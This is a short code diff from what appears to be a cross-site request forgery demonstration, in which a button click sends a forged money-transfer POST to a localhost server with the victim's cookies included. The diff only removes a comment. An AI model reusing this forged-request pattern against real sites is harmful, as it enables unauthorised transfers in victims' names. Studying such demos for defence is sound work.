@@ -6,7 +6,7 @@ btnForgery.addEventListener('click', function(event) {
   const body = new URLSearchParams('amount=1000&description=Gotcha!&to=Evil-Scammers');
     fetch('http://localhost:3000/transfer', {
     body,
-    credentials: 'include', // include cookies, despite being a cross-origin request
+    credentials: 'include', 
     method: 'post',
     mode: 'no-cors',
     });
